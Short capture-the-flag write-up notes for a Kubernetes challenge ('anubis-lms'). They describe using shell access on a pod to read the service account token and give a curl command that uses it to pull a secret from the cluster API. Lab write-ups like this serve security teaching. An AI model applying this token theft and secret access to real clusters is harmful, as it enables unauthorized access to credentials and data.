# CTF101 Osiris

## kubernetes

### anubis-lms

* Use system commands in c++ to run shell commands on the pod.
* The vulnerability is that the service account for the pod has access to the
  kubernetes api.
* access the service account token from
  `/var/run/secrets/kubernetes.io/serviceaccount/token`
* use `env` to read the KUBERNETES_SERVICE_HOST and KUBERNETES_SERVICE_PORT.

```bash
curl -k -H \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\" https://10.96.0.1/api/v1/namespaces/anubis/secret/flag
```
